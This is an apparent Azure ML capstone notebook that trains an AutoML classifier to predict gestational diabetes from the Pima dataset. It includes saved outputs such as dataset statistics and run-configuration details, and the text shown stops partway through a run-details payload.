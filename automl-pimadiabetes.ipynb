{
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Automated ML\n",
        "\n",
        "Import Dependencies. "
      ],
      "metadata": {}
    },
    {
      "cell_type": "code",
      "source": [
        "import logging\n",
        "import os\n",
        "import csv\n",
        "\n",
        "from matplotlib import pyplot as plt\n",
        "import numpy as np\n",
        "import pandas as pd\n",
        "from sklearn import datasets\n",
        "import pkg_resources\n",
        "\n",
        "import azureml.core\n",
        "from azureml.core.experiment import Experiment\n",
        "from azureml.core.workspace import Workspace\n",
        "from azureml.train.automl import AutoMLConfig\n",
        "from azureml.core.dataset import Dataset\n",
        "\n",
        "from azureml.pipeline.steps import AutoMLStep\n",
        "\n",
        "#!pip install azureml-sdk==1.19.0\n",
        "\n",
        "# Check core SDK version number\n",
        "print(\"SDK version:\", azureml.core.VERSION)"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "SDK version: 1.20.0\n"
          ]
        }
      ],
      "execution_count": 1,
      "metadata": {
        "gather": {
          "logged": 1612173401251
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Dataset\n",
        "\n",
        "### Overview\n",
        "I will be using a diabetes dataset from datahub.io dataset on gestational diabetes. https://datahub.io/machine-learning/diabetes/r/diabetes.csv\n",
        "This dataset will aid to forecast gestational diabetes in women.\n"
      ],
      "metadata": {}
    },
    {
      "cell_type": "code",
      "source": [
        "from azureml.core.compute_target import ComputeTargetException\n",
        "from azureml.core.compute import AmlCompute\n",
        "from azureml.core.compute import ComputeTarget\n",
        "\n",
        "ws = Workspace.from_config()\n",
        "print(ws.name, ws.resource_group, ws.location, ws.subscription_id, sep = '\\n')\n",
        "\n",
        "# NOTE: update the cluster name to match the existing cluster\n",
        "# Choose a name for your CPU cluster\n",
        "amlcompute_cluster_name = \"pimadiabetes\"\n",
        "\n",
        "# Verify that cluster does not exist already\n",
        "try:\n",
        "    compute_target = ComputeTarget(workspace=ws, name=amlcompute_cluster_name)\n",
        "    print('Found existing cluster, use it.')\n",
        "except ComputeTargetException:\n",
        "    compute_config = AmlCompute.provisioning_configuration(vm_size='STANDARD_DS2_V12',# for GPU, use \"STANDARD_NC6\"\n",
        "                                                           #vm_priority = 'lowpriority', # optional\n",
        "                                                           max_nodes=5)\n",
        "    compute_target = ComputeTarget.create(ws, amlcompute_cluster_name, compute_config)\n",
        "\n",
        "compute_target.wait_for_completion(show_output=True, min_node_count = 1, timeout_in_minutes = 3)\n",
        "# For a more detailed view of current AmlCompute status, use get_status().\n",
        "\n",
        "###################\n",
        "# Define Dataset\n",
        "###################\n",
        "found = False\n",
        "key = \"pimadiabetes\"\n",
        "description_text = \"Capstone Project - Forecast Diabetes\"\n",
        "\n",
        "if key in ws.datasets.keys(): \n",
        "        found = True\n",
        "        dataset = ws.datasets[key] \n",
        "\n",
        "if not found:\n",
        "        # Create AML Dataset and register it into Workspace\n",
        "        example_data = 'https://datahub.io/machine-learning/diabetes/r/diabetes.csv'\n",
        "        dataset = Dataset.Tabular.from_delimited_files(example_data)        \n",
        "        #Register Dataset in Workspace\n",
        "        dataset = dataset.register(workspace=ws,\n",
        "                                   name=key,\n",
        "                                   description=description_text)\n",
        "\n",
        "\n",
        "df = dataset.to_pandas_dataframe()\n",
        "df.describe()"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "trn-aue-aa-ml\n",
            "trn-aue-advanced-analytics-ml\n",
            "australiaeast\n",
            "8a086c9c-5530-4791-89af-62c8cdfda3fd\n",
            "Found existing cluster, use it.\n",
            "Succeeded....................................\n",
            "AmlCompute wait for completion finished\n",
            "\n",
            "Wait timeout has been reached\n",
            "Current provisioning state of AmlCompute is \"Succeeded\" and current node count is \"0\"\n"
          ]
        },
        {
          "output_type": "execute_result",
          "execution_count": 2,
          "data": {
            "text/plain": "             preg        plas        pres        skin        insu        mass  \\\ncount  768.000000  768.000000  768.000000  768.000000  768.000000  768.000000   \nmean     3.845052  120.894531   69.105469   20.536458   79.799479   31.992578   \nstd      3.369578   31.972618   19.355807   15.952218  115.244002    7.884160   \nmin      0.000000    0.000000    0.000000    0.000000    0.000000    0.000000   \n25%      1.000000   99.000000   62.000000    0.000000    0.000000   27.300000   \n50%      3.000000  117.000000   72.000000   23.000000   30.500000   32.000000   \n75%      6.000000  140.250000   80.000000   32.000000  127.250000   36.600000   \nmax     17.000000  199.000000  122.000000   99.000000  846.000000   67.100000   \n\n             pedi         age  \ncount  768.000000  768.000000  \nmean     0.471876   33.240885  \nstd      0.331329   11.760232  \nmin      0.078000   21.000000  \n25%      0.243750   24.000000  \n50%      0.372500   29.000000  \n75%      0.626250   41.000000  \nmax      2.420000   81.000000  ",
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>preg</th>\n      <th>plas</th>\n      <th>pres</th>\n      <th>skin</th>\n      <th>insu</th>\n      <th>mass</th>\n      <th>pedi</th>\n      <th>age</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>count</th>\n      <td>768.000000</td>\n      <td>768.000000</td>\n      <td>768.000000</td>\n      <td>768.000000</td>\n      <td>768.000000</td>\n      <td>768.000000</td>\n      <td>768.000000</td>\n      <td>768.000000</td>\n    </tr>\n    <tr>\n      <th>mean</th>\n      <td>3.845052</td>\n      <td>120.894531</td>\n      <td>69.105469</td>\n      <td>20.536458</td>\n      <td>79.799479</td>\n      <td>31.992578</td>\n      <td>0.471876</td>\n      <td>33.240885</td>\n    </tr>\n    <tr>\n      <th>std</th>\n      <td>3.369578</td>\n      <td>31.972618</td>\n      <td>19.355807</td>\n      <td>15.952218</td>\n      <td>115.244002</td>\n      <td>7.884160</td>\n      <td>0.331329</td>\n      <td>11.760232</td>\n    </tr>\n    <tr>\n      <th>min</th>\n      <td>0.000000</td>\n      <td>0.000000</td>\n      <td>0.000000</td>\n      <td>0.000000</td>\n      <td>0.000000</td>\n      <td>0.000000</td>\n      <td>0.078000</td>\n      <td>21.000000</td>\n    </tr>\n    <tr>\n      <th>25%</th>\n      <td>1.000000</td>\n      <td>99.000000</td>\n      <td>62.000000</td>\n      <td>0.000000</td>\n      <td>0.000000</td>\n      <td>27.300000</td>\n      <td>0.243750</td>\n      <td>24.000000</td>\n    </tr>\n    <tr>\n      <th>50%</th>\n      <td>3.000000</td>\n      <td>117.000000</td>\n      <td>72.000000</td>\n      <td>23.000000</td>\n      <td>30.500000</td>\n      <td>32.000000</td>\n      <td>0.372500</td>\n      <td>29.000000</td>\n    </tr>\n    <tr>\n      <th>75%</th>\n      <td>6.000000</td>\n      <td>140.250000</td>\n      <td>80.000000</td>\n      <td>32.000000</td>\n      <td>127.250000</td>\n      <td>36.600000</td>\n      <td>0.626250</td>\n      <td>41.000000</td>\n    </tr>\n    <tr>\n      <th>max</th>\n      <td>17.000000</td>\n      <td>199.000000</td>\n      <td>122.000000</td>\n      <td>99.000000</td>\n      <td>846.000000</td>\n      <td>67.100000</td>\n      <td>2.420000</td>\n      <td>81.000000</td>\n    </tr>\n  </tbody>\n</table>\n</div>"
          },
          "metadata": {}
        }
      ],
      "execution_count": 2,
      "metadata": {
        "collapsed": true,
        "jupyter": {
          "source_hidden": false,
          "outputs_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        },
        "gather": {
          "logged": 1612173597296
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# choose a name for experiment\n",
        "experiment_name = 'automlpimadiabetes'\n",
        "project_folder = './Augusto_Avila/capstone'\n",
        "\n",
        "experiment=Experiment(ws, experiment_name)"
      ],
      "outputs": [],
      "execution_count": 3,
      "metadata": {
        "gather": {
          "logged": 1612173646515
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## AutoML Configuration\n",
        "\n",
        "Choosing a classification model to predict the likelihood of gestational diabetes, the variable class will hold the forecasted value and will be using the \n",
        "AUC_weighed metric as the result of initial automl experiment execution as the primary metric"
      ],
      "metadata": {}
    },
    {
      "cell_type": "code",
      "source": [
        "automl_settings = {\n",
        "    \"experiment_timeout_minutes\": 60,\n",
        "    \"max_concurrent_iterations\": 5,\n",
        "    \"primary_metric\" : 'AUC_weighted'\n",
        "}\n",
        "automl_config = AutoMLConfig(compute_target=compute_target,\n",
        "                             task = \"classification\",\n",
        "                             training_data=dataset,\n",
        "                             label_column_name=\"class\",   \n",
        "                             path = project_folder,\n",
        "                             enable_early_stopping= True,\n",
        "                             enable_onnx_compatible_models=True,\n",
        "                             featurization= 'auto',\n",
        "                             debug_log = \"automl_errors.log\",\n",
        "                             **automl_settings\n",
        "                            )\n"
      ],
      "outputs": [],
      "execution_count": 4,
      "metadata": {
        "gather": {
          "logged": 1612173648944
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "code",
      "source": [
        "## Submit Experiment\n",
        "\n",
        "from azureml.widgets import RunDetails\n",
        "from azureml.core.run import Run\n",
        "\n",
        "remote_run = experiment.submit(automl_config,show_output=True)\n"
      ],
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Running on remote.\n",
            "No run_configuration provided, running on pimadiabetes with default configuration\n",
            "Running on remote compute: pimadiabetes\n",
            "Parent Run ID: AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\n",
            "\n",
            "Current status: FeaturesGeneration. Generating features for the dataset.\n"
          ]
        }
      ],
      "execution_count": 5,
      "metadata": {
        "gather": {
          "logged": 1611734117829
        },
        "jupyter": {
          "outputs_hidden": false,
          "source_hidden": false
        },
        "nteract": {
          "transient": {
            "deleting": false
          }
        }
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## Run Details\n",
        "\n"
      ],
      "metadata": {}
    },
    {
      "cell_type": "code",
      "source": [
        "from azureml.widgets import RunDetails\n",
        "\n",
        "RunDetails(remote_run).show()\n",
        "print(remote_run.get_portal_url())\n",
        "remote_run.wait_for_completion(show_output=True)\n",
        "\n",
        "\n",
        "best_run, fitted_model = remote_run.get_output()\n",
        "\n",
        "fitted_model.steps[1][1].estimators"
      ],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "_AutoMLWidget(widget_settings={'childWidgetDisplay': 'popup', 'send_telemetry': False, 'log_level': 'INFO', 's…",
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "7d868606524c4d03b5a3d836381e61ac"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "application/aml.mini.widget.v1": "{\"status\": \"Completed\", \"workbench_run_details_uri\": \"https://ml.azure.com/experiments/automlpimadiabetes/runs/AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8?wsid=/subscriptions/8a086c9c-5530-4791-89af-62c8cdfda3fd/resourcegroups/trn-aue-advanced-analytics-ml/workspaces/trn-aue-aa-ml\", \"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"run_properties\": {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"created_utc\": \"2021-02-01T10:01:04.724759Z\", \"properties\": {\"num_iterations\": \"1000\", \"training_type\": \"TrainFull\", \"acquisition_function\": \"EI\", \"primary_metric\": \"AUC_weighted\", \"train_split\": \"0\", \"acquisition_parameter\": \"0\", \"num_cross_validation\": null, \"target\": \"pimadiabetes\", \"AMLSettingsJsonString\": \"{\\\"path\\\":null,\\\"name\\\":\\\"automlpimadiabetes\\\",\\\"subscription_id\\\":\\\"8a086c9c-5530-4791-89af-62c8cdfda3fd\\\",\\\"resource_group\\\":\\\"trn-aue-advanced-analytics-ml\\\",\\\"workspace_name\\\":\\\"trn-aue-aa-ml\\\",\\\"region\\\":\\\"australiaeast\\\",\\\"compute_target\\\":\\\"pimadiabetes\\\",\\\"spark_service\\\":null,\\\"azure_service\\\":\\\"remote\\\",\\\"many_models\\\":false,\\\"pipeline_fetch_max_batch_size\\\":1,\\\"iterations\\\":1000,\\\"primary_metric\\\":\\\"AUC_weighted\\\",\\\"task_type\\\":\\\"classification\\\",\\\"data_script\\\":null,\\\"validation_size\\\":0.0,\\\"n_cross_validations\\\":null,\\\"y_min\\\":null,\\\"y_max\\\":null,\\\"num_classes\\\":null,\\\"featurization\\\":\\\"auto\\\",\\\"_ignore_package_version_incompatibilities\\\":false,\\\"is_timeseries\\\":false,\\\"max_cores_per_iteration\\\":1,\\\"max_concurrent_iterations\\\":5,\\\"iteration_timeout_minutes\\\":null,\\\"mem_in_mb\\\":null,\\\"enforce_time_on_windows\\\":false,\\\"experiment_timeout_minutes\\\":60,\\\"experiment_exit_score\\\":null,\\\"whitelist_models\\\":null,\\\"blacklist_algos\\\":[\\\"TensorFlowLinearClassifier\\\",\\\"TensorFlowDNN\\\"],\\\"supported_models\\\":[\\\"SVM\\\",\\\"ExtremeRandomTrees\\\",\\\"LightGBM\\\",\\\"AveragedPerceptronClassifier\\\",\\\"LinearSVM\\\",\\\"RandomForest\\\",\\\"BernoulliNaiveBayes\\\",\\\"SGD\\\",\\\"DecisionTree\\\",\\\"GradientBoosting\\\",\\\"XGBoostClassifier\\\",\\\"TensorFlowDNN\\\",\\\"LogisticRegression\\\",\\\"TensorFlowLinearClassifier\\\",\\\"MultinomialNaiveBayes\\\",\\\"KNN\\\"],\\\"auto_blacklist\\\":true,\\\"blacklist_samples_reached\\\":false,\\\"exclude_nan_labels\\\":true,\\\"verbosity\\\":20,\\\"_debug_log\\\":\\\"azureml_automl.log\\\",\\\"show_warnings\\\":false,\\\"model_explainability\\\":true,\\\"service_url\\\":null,\\\"sdk_url\\\":null,\\\"sdk_packages\\\":null,\\\"enable_onnx_compatible_models\\\":true,\\\"enable_split_onnx_featurizer_estimator_models\\\":false,\\\"vm_type\\\":\\\"STANDARD_DS12_V2\\\",\\\"telemetry_verbosity\\\":20,\\\"send_telemetry\\\":true,\\\"enable_dnn\\\":false,\\\"scenario\\\":\\\"SDK-1.13.0\\\",\\\"environment_label\\\":null,\\\"force_text_dnn\\\":false,\\\"enable_feature_sweeping\\\":false,\\\"enable_early_stopping\\\":true,\\\"early_stopping_n_iters\\\":10,\\\"metrics\\\":null,\\\"enable_ensembling\\\":true,\\\"enable_stack_ensembling\\\":false,\\\"ensemble_iterations\\\":15,\\\"enable_tf\\\":false,\\\"enable_subsampling\\\":null,\\\"subsample_seed\\\":null,\\\"enable_nimbusml\\\":false,\\\"enable_streaming\\\":false,\\\"force_streaming\\\":false,\\\"track_child_runs\\\":true,\\\"allowed_private_models\\\":[],\\\"label_column_name\\\":\\\"class\\\",\\\"weight_column_name\\\":null,\\\"cv_split_column_names\\\":null,\\\"enable_local_managed\\\":false,\\\"_local_managed_run_id\\\":null,\\\"cost_mode\\\":1,\\\"lag_length\\\":0,\\\"metric_operation\\\":\\\"maximize\\\",\\\"preprocess\\\":true}\", \"DataPrepJsonString\": \"{\\\\\\\"training_data\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"blocks\\\\\\\\\\\\\\\": [{\\\\\\\\\\\\\\\"id\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"40256732-caf5-4231-aa61-100bc802370b\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Microsoft.DPrep.GetDatastoreFilesBlock\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"arguments\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"datastores\\\\\\\\\\\\\\\": [{\\\\\\\\\\\\\\\"datastoreName\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"workspaceblobstore\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"path\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UI/01-26-2021_082414_UTC/diabetes_csv.csv\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"resourceGroup\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"trn-aue-advanced-analytics-ml\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"subscription\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"8a086c9c-5530-4791-89af-62c8cdfda3fd\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"workspaceName\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"trn-aue-aa-ml\\\\\\\\\\\\\\\"}]}, \\\\\\\\\\\\\\\"localData\\\\\\\\\\\\\\\": {}, \\\\\\\\\\\\\\\"isEnabled\\\\\\\\\\\\\\\": true, \\\\\\\\\\\\\\\"name\\\\\\\\\\\\\\\": null, \\\\\\\\\\\\\\\"annotation\\\\\\\\\\\\\\\": null}, {\\\\\\\\\\\\\\\"id\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"7585aae3-de77-49af-b03a-fc49e7d03f0b\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Microsoft.DPrep.ParseDelimitedBlock\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"arguments\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"columnHeadersMode\\\\\\\\\\\\\\\": 1, \\\\\\\\\\\\\\\"fileEncoding\\\\\\\\\\\\\\\": 0, \\\\\\\\\\\\\\\"handleQuotedLineBreaks\\\\\\\\\\\\\\\": false, \\\\\\\\\\\\\\\"preview\\\\\\\\\\\\\\\": false, \\\\\\\\\\\\\\\"separator\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"skipRows\\\\\\\\\\\\\\\": 0, \\\\\\\\\\\\\\\"skipRowsMode\\\\\\\\\\\\\\\": 0}, \\\\\\\\\\\\\\\"localData\\\\\\\\\\\\\\\": {}, \\\\\\\\\\\\\\\"isEnabled\\\\\\\\\\\\\\\": true, \\\\\\\\\\\\\\\"name\\\\\\\\\\\\\\\": null, \\\\\\\\\\\\\\\"annotation\\\\\\\\\\\\\\\": null}, {\\\\\\\\\\\\\\\"id\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2a4a8c85-06e5-473c-8e9d-66a1caae4b31\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Microsoft.DPrep.DropColumnsBlock\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"arguments\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"columns\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 0, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumns\\\\\\\\\\\\\\\": [\\\\\\\\\\\\\\\"Path\\\\\\\\\\\\\\\"]}}}, \\\\\\\\\\\\\\\"localData\\\\\\\\\\\\\\\": {}, \\\\\\\\\\\\\\\"isEnabled\\\\\\\\\\\\\\\": true, \\\\\\\\\\\\\\\"name\\\\\\\\\\\\\\\": null, \\\\\\\\\\\\\\\"annotation\\\\\\\\\\\\\\\": null}, {\\\\\\\\\\\\\\\"id\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"648ce0d8-a8e2-4da0-9c92-19ec61f9e142\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Microsoft.DPrep.SetColumnTypesBlock\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"arguments\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"columnConversion\\\\\\\\\\\\\\\": [{\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Path\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 0}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"preg\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"plas\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"pres\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"skin\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"insu\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"mass\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 3}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"pedi\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 3}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"age\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"class\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 0}]}, \\\\\\\\\\\\\\\"localData\\\\\\\\\\\\\\\": {}, \\\\\\\\\\\\\\\"isEnabled\\\\\\\\\\\\\\\": true, \\\\\\\\\\\\\\\"name\\\\\\\\\\\\\\\": null, \\\\\\\\\\\\\\\"annotation\\\\\\\\\\\\\\\": null}], \\\\\\\\\\\\\\\"inspectors\\\\\\\\\\\\\\\": [], \\\\\\\\\\\\\\\"meta\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"savedDatasetId\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"3a186ba5-5d2b-44ee-9193-6374f4ee91f1\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"datasetType\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"tabular\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"subscriptionId\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"8a086c9c-5530-4791-89af-62c8cdfda3fd\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"workspaceId\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"c3f71a46-26f3-421c-8037-b5fa54f65e44\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"workspaceLocation\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"australiaeast\\\\\\\\\\\\\\\"}}\\\\\\\", \\\\\\\"activities\\\\\\\": 0}\", \"EnableSubsampling\": null, \"runTemplate\": \"AutoML\", \"azureml.runsource\": \"automl\", \"display_task_type\": \"classification\", \"dependencies_versions\": \"{\\\"azureml-widgets\\\": \\\"1.9.0\\\", \\\"azureml-train\\\": \\\"1.18.0\\\", \\\"azureml-train-restclients-hyperdrive\\\": \\\"1.18.0\\\", \\\"azureml-train-core\\\": \\\"1.18.0.post1\\\", \\\"azureml-train-automl\\\": \\\"1.9.0\\\", \\\"azureml-train-automl-runtime\\\": \\\"1.20.0\\\", \\\"azureml-train-automl-client\\\": \\\"1.20.0\\\", \\\"azureml-tensorboard\\\": \\\"1.9.0\\\", \\\"azureml-telemetry\\\": \\\"1.20.0\\\", \\\"azureml-samples\\\": \\\"0+unknown\\\", \\\"azureml-pipeline\\\": \\\"1.18.0\\\", \\\"azureml-pipeline-steps\\\": \\\"1.18.0\\\", \\\"azureml-pipeline-core\\\": \\\"1.18.0\\\", \\\"azureml-opendatasets\\\": \\\"1.9.0\\\", \\\"azureml-monitoring\\\": \\\"0.1.0a18\\\", \\\"azureml-model-management-sdk\\\": \\\"1.0.1b6.post1\\\", \\\"azureml-mlflow\\\": \\\"1.9.0\\\", \\\"azureml-interpret\\\": \\\"1.20.0\\\", \\\"azureml-explain-model\\\": \\\"1.9.0\\\", \\\"azureml-defaults\\\": \\\"1.20.0\\\", \\\"azureml-dataset-runtime\\\": \\\"1.20.0\\\", \\\"azureml-dataprep\\\": \\\"2.7.3\\\", \\\"azureml-dataprep-rslex\\\": \\\"1.5.0\\\", \\\"azureml-dataprep-native\\\": \\\"27.0.0\\\", \\\"azureml-datadrift\\\": \\\"1.9.0\\\", \\\"azureml-core\\\": \\\"1.20.0\\\", \\\"azureml-contrib-services\\\": \\\"1.9.0\\\", \\\"azureml-contrib-server\\\": \\\"1.9.0\\\", \\\"azureml-contrib-reinforcementlearning\\\": \\\"1.9.0\\\", \\\"azureml-contrib-pipeline-steps\\\": \\\"1.9.0\\\", \\\"azureml-contrib-notebook\\\": \\\"1.9.0\\\", \\\"azureml-contrib-interpret\\\": \\\"1.9.0\\\", \\\"azureml-contrib-gbdt\\\": \\\"1.9.0\\\", \\\"azureml-contrib-fairness\\\": \\\"1.9.0\\\", \\\"azureml-contrib-dataset\\\": \\\"1.9.0\\\", \\\"azureml-cli-common\\\": \\\"1.9.0\\\", \\\"azureml-automl-runtime\\\": \\\"1.20.0\\\", \\\"azureml-automl-core\\\": \\\"1.20.0\\\", \\\"azureml-accel-models\\\": \\\"1.9.0\\\"}\", \"_aml_system_scenario_identification\": \"Remote.Parent\", \"ClientType\": \"SDK\", \"environment_cpu_name\": \"AzureML-AutoML\", \"environment_cpu_label\": \"prod\", \"environment_gpu_name\": \"AzureML-AutoML-GPU\", \"environment_gpu_label\": \"prod\", \"root_attribution\": \"automl\", \"attribution\": \"AutoML\", \"Orchestrator\": \"AutoML\", \"CancelUri\": \"https://australiaeast.experiments.azureml.net/jasmine/v1.0/subscriptions/8a086c9c-5530-4791-89af-62c8cdfda3fd/resourceGroups/trn-aue-advanced-analytics-ml/providers/Microsoft.MachineLearningServices/workspaces/trn-aue-aa-ml/experimentids/79cef33c-d1d9-48fc-bdb5-bf983ac4c63c/cancel/AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8\", \"ClientSdkVersion\": \"1.20.0.post1\", \"snapshotId\": \"00000000-0000-0000-0000-000000000000\", \"SetupRunId\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_setup\", \"SetupRunContainerId\": \"dcid.AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_setup\", \"FeaturizationRunJsonPath\": \"featurizer_container.json\", \"FeaturizationRunId\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_featurize\", 